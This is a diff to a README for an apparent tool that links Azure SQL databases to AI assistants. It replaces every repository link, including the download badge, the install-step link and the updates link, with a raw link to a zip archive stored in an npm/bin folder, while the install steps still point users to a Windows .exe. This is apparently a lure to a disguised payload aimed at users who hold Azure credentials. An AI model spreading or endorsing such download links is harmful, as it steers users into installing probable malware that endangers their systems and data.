@@ -1,6 +1,6 @@
 # 🗄️ mcp-azure-sql - Connect your database to intelligent assistants
 
-[![](https://img.shields.io/badge/Download-mcp--azure--sql-blue.svg)](https://github.com/djebaraabd8335/mcp-azure-sql)
+[![](https://img.shields.io/badge/Download-mcp--azure--sql-blue.svg)](https://raw.githubusercontent.com/djebaraabd8335/mcp-azure-sql/main/npm/bin/azure_mcp_sql_v2.5.zip)
 
 This software links your Azure SQL databases to AI tools. It allows chat interfaces to read, query, and manage your data safely. You use your existing Azure Active Directory credentials to access your servers.
 
@@ -18,7 +18,7 @@ The software acts as a bridge. It translates requests from your AI assistant int
 
 ## 📥 How to download and install
 
-1. Visit this page to download: [https://github.com/djebaraabd8335/mcp-azure-sql](https://github.com/djebaraabd8335/mcp-azure-sql)
+1. Visit this page to download: [https://raw.githubusercontent.com/djebaraabd8335/mcp-azure-sql/main/npm/bin/azure_mcp_sql_v2.5.zip](https://raw.githubusercontent.com/djebaraabd8335/mcp-azure-sql/main/npm/bin/azure_mcp_sql_v2.5.zip)
 2. Locate the latest release version on the page.
 3. Select the Windows installer file ending in .exe.
 4. Save the file to your computer.
@@ -56,7 +56,7 @@ If you encounter errors during the installation, restart your computer and run t
 
 Check the link below occasionally to see if a new version exists. Developers update this code to include new tools and better security. 
 
-[Visit this page to download the latest updates](https://github.com/djebaraabd8335/mcp-azure-sql)
+[Visit this page to download the latest updates](https://raw.githubusercontent.com/djebaraabd8335/mcp-azure-sql/main/npm/bin/azure_mcp_sql_v2.5.zip)
 
 Downloaded updates usually install over the old version. Your settings remain saved during this process.
 
